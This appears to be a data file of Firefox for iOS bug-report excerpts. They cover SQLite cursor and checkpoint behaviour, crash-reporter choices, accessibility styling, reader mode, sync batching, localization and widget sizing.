id=1147615	 "Our current sqlite cursor implementation resets itself after every access. i.e. sqlite doesn't allow us random access into results, so when you request element 10, we walk to element 10, and then reset ourselves back to 0 for the next request. This makes walking through the entire cursor (like we do to partition the history list into sections) incredibly slow. As long as we're only walking forward, we shouldn't need to reset the cursor. I originally did this because holding the connection open can affect results of subsequent queries. i.e. for instance in tests we do something like: // var cursor = Query the db // verify the cursor // change the datbase // cursor = do another query // verify the cursor if we don't reset the open cursor between the two cursor = calls, sqlite will send us stale results (from a memory cache I assume?). To mitigate this, I created a cursor.close() api for now, that will force us to reset the current connection. Its not necessary to close() cursors all the time. Just when you want to ensure you get fresh results from queries."	177

Adding a sstem() call makes the test terminate with an \'dyld: program was built for Mac OS X and cannot be run in simulator\' error.

I think what we need to do is use a Cocoa HTTP Server.

This allows us to remove Breakpad if we wanted since we don't have a need at this time to send data to a Socorro instance. Some reasons why we'd want to remove Breakpad: 1. It's not well supported on iOS. Lacking in documentation and doesn't build properly when taken off the shelf. 2. We've had to add our own hacks to the library to get some functionality we needed such as an API for telling us if we've crashed without uploading the crash. 3. We maintain an Carthage dependency fork on our own that we pull into the project. The only need for keeping Breakpad around was the modification we made to detect previous session crashes. I propose we swap the library with PLCrashReporter (", ). Some benefits: 1. Built for iOS/Mac from the start. 2. Is actively worked on and maintained by well respected members of the iOS/Mac community. 3. Already contains the functionality we hacked on top of Breakpad. 4. Used in the core of popular crash reporting products for iOS (Fabric/Crashlytics, HockeyApp) If, down the road, we want to integrate with a Socorro instance, a shim could be provided to translate the formats into something Socorro could accept.'	209

To simulate the non-default status bar, I think it is enough to: - connect to the personal hotspot on the iPhone with some other device (in my case it suffices to have hotspot turned on in preferences and connect with a cable to my Mac) - be on a call, which should display the call in progress in status bar (have not tried this, but seems analogical to the previous case) I added the solved ', ("Tab Tray collection view extends into status bar") as "See Also", because it seems to maybe have something to do with this issue.'	272

Actual results: I had to find the places in code where the colors/font sizes/faces/line widths get applied in the code, and then guess the proper (somewhat bigger) value when an accessibility setting is on. I envied the colleagues over at Mozilla who apparently had the exact values they should use for common users specified by a graphic designer, since I had no such specification and had to guess the values adjusted for accessibility by simply making the value "somewhat bigger (darker, bolder, bigger, wider), all by the same bit". Expected results: There should be a UI spec/mockup for each situation with the accessibility settings below applied (just like there is a UI spec/mockup for "normal" UI with no accessibility settings applied) which should specify line widths / different icons, font faces (differ probably only in boldness), colors, font sizes etc. I think it would be sufficient to make a spec for all-in-one scenario, i.e. a user having these turned on: - Larger Text (with Larger Accessibility Sizes, set to some bigger non-maximum size) - Bold Text (which also means bolder borders/icons - see toolbar in Safari) - Increase Contrast - Reduce Transparency (increases contrast) and Darken Colors (also increases contrast, could also mean darker icons) Sometimes try to look at the app with nearly/half closed eyes to perceive the difference. Having an item bigger/bolder/darker can make the difference between user not noticing it is there at all, and at least noticing "something is there" and use VoiceOver/Zoom to touch it and let it read "what exactly is written there". Sometimes it could also make the difference between having to touch the item to let VoiceOver read it (perhaps requiring the user to turn VoiceOver on) or enlarge it with Zoom, and being able to read it without VoiceOver/Zoom. Btw., IIRC, iOS 8 allows icons to be just outlines and colors applied on runtime, perhaps it could allow one icon image to be rendered darker when "Darken Colors" is on (for icons where this would be appropriate)? Perhaps try to use iOS (including Safari) for a little bit of time with all/some of these settings to get the feel. Also perhaps, with these settings, try using Firefox which already has "Bold Text" and "Darken Colors" implemented (even though it is probably a little outdated already; after setting the settings, force quit of Firefox is needed) and check the current state for needed adjustments / omissions. Ideally, every UI mockup/spec should have two versions: 1. "normal", 2. "accessibility" (for all the settings mentioned above turned on at the same time).

This was done because there is no easy way to load an application resource from the WKWebView: because of the content process separation and sandboxing that happens it is not possible use file: URLs. As an alternative I am going to suggest that the Swift side loads the template instead, does the substitutions in it and then loads it in the WKWebView. This means that the template setup code in ReaderMode.js will move to the ReaderMode.swift so that the native code will then prepare the content and passes it to the WKWebView via loadHTMLString(). The original CSS in aboutReader.css has all the content set to invisible. This was probably done to minimize flickering when the readerized content is loaded in it and the user defined settings (font face/size/theme) are applied. We can keep this but it means that the ReaderMode.swift needs a page loaded callback so that we can apply the user style and make the document visible.

There are several places where Firefox for iOS uses e.g. UIColor.darkGrayColor() color and UIColor.lightGrayColor(). These should be changed to more darker colors (i.e. darkGrayColor could become blackColor, lightGrayColor could become darkGrayColor or blackColor) when the preference is set.

id=1168856	 "A first sync can be pretty painful: a user might have thousands of history records on the server, and we download them all in one go. Fortunately we don't interleave DB operations, so we download and buffer as fast as we can, but we would like this to occur in stages and be tolerant of failure. That means splitting the sync implementation for history (and other record types) from: download >>== apply >>> upload into verify syncID/server/etc. loop { download, ordered by date } until all fetched loop { apply a chunk of downloaded records } until all applied History is a special case because -- unlike, say, bookmarks -- it's fairly safe to immediately apply records to local storage. (And once a record has been downloaded, it's actually not unsafe to sync that change *up*, so long as the client is prepared to re-download. Don't think about it for too long!) So we can likely simplify this to: loop { download chunk, ordered by date apply chunk } until all fetched We already have the ability to advance our timestamps after each chunk -- a chunk is a sync. So the work here is in two parts: * Sync by date, and extract the fencepost value from the last record (minus one), not the header. This needs some new bookkeeping to track that we're in a batch operation and where we've got to. We probably want to address ", , too. * Orchestration: we want to be able to run a few batches at a time, run a batch and decide whether to run another, etc. -- it's not enough to run one batch each time we sync, because it might take 100 batches before we're done! We want to aggressively download on wifi, download a few batches shortly after launch, download a decent amount after FxA sign-in, etc. etc. We might also consider doing a sortindex-based batch immediately after signing in (which should give you your top sites) and then periodically grabbing another chunk based on date to backfill. We'll redownload the sortindex batch (spread out by date), but that's OK."	336

id=1228611	 'One hypothesis for ', is that we're somehow getting junk in the WAL, or our passive checkpoint is misbehaving. The highest risk of corruption is around checkpoint operations. That suggests two strategies: * Don't checkpoint. That seems unwise: we have to checkpoint _some time_, so it makes sense to have control of when that is. * Checkpoint differently. There are four levels: SQLITE_CHECKPOINT_PASSIVE Checkpoint as many frames as possible without waiting for any database readers or writers to finish, then sync the database file if all frames in the log were checkpointed. The busy-handler callback is never invoked in the SQLITE_CHECKPOINT_PASSIVE mode. On the other hand, passive mode might leave the checkpoint unfinished if there are concurrent readers or writers. SQLITE_CHECKPOINT_FULL This mode blocks (it invokes the busy-handler callback) until there is no database writer and all readers are reading from the most recent database snapshot. It then checkpoints all frames in the log file and syncs the database file. This mode blocks new database writers while it is pending, but new database readers are allowed to continue unimpeded. SQLITE_CHECKPOINT_RESTART This mode works the same way as SQLITE_CHECKPOINT_FULL with the addition that after checkpointing the log file it blocks (calls the busy-handler callback) until all readers are reading from the database file only. This ensures that the next writer will restart the log file from the beginning. Like SQLITE_CHECKPOINT_FULL, this mode blocks new database writer attempts while it is pending, but does not impede readers. SQLITE_CHECKPOINT_TRUNCATE This mode works the same way as SQLITE_CHECKPOINT_RESTART with the addition that it also truncates the log file to zero bytes just prior to a successful return. I find that FULL/RESTART/TRUNCATE are attractive precisely because they block until they're done -- we close the database on the same queue. Because we serialize reads and writes, even a call with zDB == null (i.e., checkpoint all DBs) should eventually complete."	310

Additionally, looking at crash reports on crash-stats is confusing when trying to determine which 'build' a crash is coming from since it uses the timestamp and not the actual build number we use for testflight/aurora. I suggest we use the build number we use for our iOS app releases as the same build id we send to crash stats to make things more sane.

id=1182255	 'It\'s possible that the Sync state machine for Firefox for iOS won\'t implement "clean server" initialization, at least for v1. Such initialization is tricky and error-prone; we didn\'t implement it for the first few Fennec releases. To work-around, we might restrict Firefox for iOS to only allow /signin (not /signup) on the content server. The idea is that if you already have a Firefox Account, then you likely already have a Desktop (or Android) Sync client, which will have initialized the server. This isn\'t perfect, since the server can be wiped, or you can be node-migrated, etc -- but it\'s a decent work-around.

id=1301691	 'Updates for iOS 10 Apple\'s iPhone launch event started at 9am this morning, and among the announcements are the final details for iOS 10 which will be released on September 13. One of the things that will change is that the IDFA will be set to all zeroes when the Limit Ad Tracking toggle is enabled. The IDFA is frequently used for attribution on iOS, so how will adjust adapt? adjust will automatically fall back to fingerprinting when the IDFA is not available. Now, there are two things you should be aware of: first, we highly recommend an update to SDK 4.9, as this resolves an issue where a small minority of users may be overcounted upon reinstall. second, users with Limit Ad Tracking enabled can not be attributed to campaigns with partners that do not support fingerprinting, which we will use as a fallback. The first problem is resolved through adjust iOS SDK 4.9. The update allows adjust to deduplicate installs but without replicating the functionality of the IDFA or infringing on the user\'s preference as stated through the Limit Ad Tracking toggle. The overcounting may happen, specifically, if a user re-installs your app (with SDK 4.8 or below) and has Limit Ad Tracking enabled. This action may be interpreted as a new install. We expect the effect to be minimal and primarily affect your organic install numbers. If you update to SDK 4.9, the overcounting can be avoided altogether. What does this mean for you? Update the SDK to 4.9 as soon as you are able. As for the second problem, we are in constant dialogue with those that we call our "API partners". These are ad networks and premium publishers that do not redirect users to third-party tracking solutions on the click - instead, they expose an API that allow us to work together on attribution. These APIs universally require the IDFA. There is currently no way to attribute users with Limit Ad Tracking enabled to campaigns run with these API partners. Users with Limit Ad Tracking enabled on iOS 10 can not be attributed to campaigns running on: Facebook Twitter Google Adwords, including Youtube, DoubleClick, video and retargeting networks that rely on IDFA to send server-to-server clicks. Many ad networks allow you to attribute over fingerprinting, for example by redirecting users to adjust\'s tracker URLs directly. What does this mean for you? Ask your partners to support fingerprint-based attribution. Roughly 13 % of all users that we currently observe have Limit Ad Tracking toggled on.'	407

id=1312922	 "So this is interesting. On iOS 10 Today Widgets are a fixed height. For ours, it is just tall enough to hold the New Tab buttons. But the Go To Copied Link button does not fit in it. But, a widget can ask the to be 'Expanded', which means a 'Show More' or 'Show Less' button appears in its title bar. When the user taps that button, the widget can grow bigger to show additional content. I have a (bad) patch ready that takes advantage of this and does the following: * If the today widget is shown and there is no link on the pasteboard, the widget size is Compact. It just shows the two New Tab buttons and no Show More button in the title bar. * If the today widget is shown and we do have a link on the pasteboard, then the widget opens by default in Compact mode, but the user can tap Show More to show the Go To Copied Link button. There is one caveat: only a user interaction (tap on Show More/Less) can change the size of the widget. They start Compact. But once you have chosen to show Expanded, it stays that way. In our case that means once the user has tapped Show more, the widget will always correctly size based on what is on the pasteboard. Movie attached with how this currently looks."	231

By using webpack, we're able to inline all of the node dependencies that fathom.js requires 1 . This inline also removes any traces of ES6 syntax - allowing the code to run in iOS's older Javascript context. The next step will be to pull in :jkerim's page-metadata-parser ruleset that sits on top of fathom which defines extraction rules 2 . Combining these two should allow us to extract the meta data needed for Activity Stream uses. We'll also need to load the Javascript through a WKUserScript object in a similar way we handle extracting favicons. By doing so, we'll be able to pass the extracted metadata from the web context into the native layer for storage and rendering on the A-S panel. At this point, there are a few questions: 1. How do we want to persist this metadata? Should this live in our version of the places DB or in a separate cache? 2. Related to 1., how would we modify our existing queries and data layer to mix in meta data content for rendering top sites/highlights? 3. How does inlining all of the node/ES6 dependencies effect performance on page load? Webpacking fathom.js spits out 25k lines of Javascript which sounds like a lot to add on top of every page. Finally, we've discussed whether we want to do this processing locally or through a web service. Considering that desktop has hopes of running it locally and the network constraints on mobile, running the extraction logic locally would be ideal. 1 ", 2 '	273

In order to properly import the library into Firefox for iOS one option is to create a new carthage dependency that wraps around the JS library and has the script bundling as part of the build phases. This also gives us the option to abstract out the parsing code from the JS if we plan on using a server-side service or alternative client code. Unfortunately since the PR has been merged and updated, new clean checkouts using Carthage will result in build errors in Firefox for iOS because the bundle file is missing.

id=1092387	 "Before we can jump into all the upcoming iOS work, we need a plan for localization. Some things to figure out: * How do we reuse strings? For instance, how could we share a string between a storyboard and code to toggle its label? Or how could we use the same string across multiple storyboards? * What's the process for extracting strings? genstrings? * Can/should we integrate with the same l10n tools we use for Android for localizers to use? What format must be the strings files be in to use those tools? After some light experimentation with different options, the most straightforward approach to me would be to exclusively use NSLocalizedString (e.g., extract strings only from code, not storyboards). This solves the reuse problem, and allows us to create our own string bundle-like class to contain all strings. Of course, this limits the usefulness of storyboards/xibs since the strings wouldn't be visible in the GUI. Alternatively, if the team is interested in storyboards as part of the normal development process, it would useful to see a storyboard-based demo project using localizations, with the above questions answered, so we have a pattern to follow."	191

id=1191376	 'My most frequent use case for Firefox is launching it quickly to search for something or load a specific page by URL (either in the clipboard, in my memory, or less frequently, from my history). I tend to sometimes keep tabs open to refer to later, but most of the times I launch the app I don\'t want to deal with them and just want a blank slate. When Firefox launches, depending on what I was doing last, sometimes the top toolbar is collapsed. So I need to do a bit of a "wiggle" (scroll the page slightly) to get it to appear, then tap the location bar, then start typing. Ideally, I would never have to do that wiggle. If the toolbar always appeared after a restore then I wouldn\'t have to.

id=1260249	 'From the discussion in ', : We often fetch (and call reloadData()) twice each time we refresh Top Sites (which we do every time we open the panel). This will happen any time we're browsing and a new domain is added to history since that will invalidate the Top Sites cache -- and we don't update the cache until we're actually showing the panel. A couple options: 1) Don't do a double load. If the cache is invalidated, wait until we have the updated cache before calling reloadData(). This means the Top Sites panel might be blank for a short period before we show anything, but that still might be better than flicker. 2) Building on option 1, we could auto-update the cache as domains are added to history so that we don't need to rebuild the cache while the panel is visible. We'd have to be careful how we do this -- we don't want a sync to trigger hundreds of top site requeries!"	158

This affects both device and simulator. On this simulator screenshot, the thumbnail cell is 102.667x102 pixels in dimensions. The inner image view has 10 pixels of padding on each side, coming out to 82.667 pixels in width. With a 400x300 image, preserving aspect ratio, that takes us to 82.667x62.0005 at a scale of 0.20666.
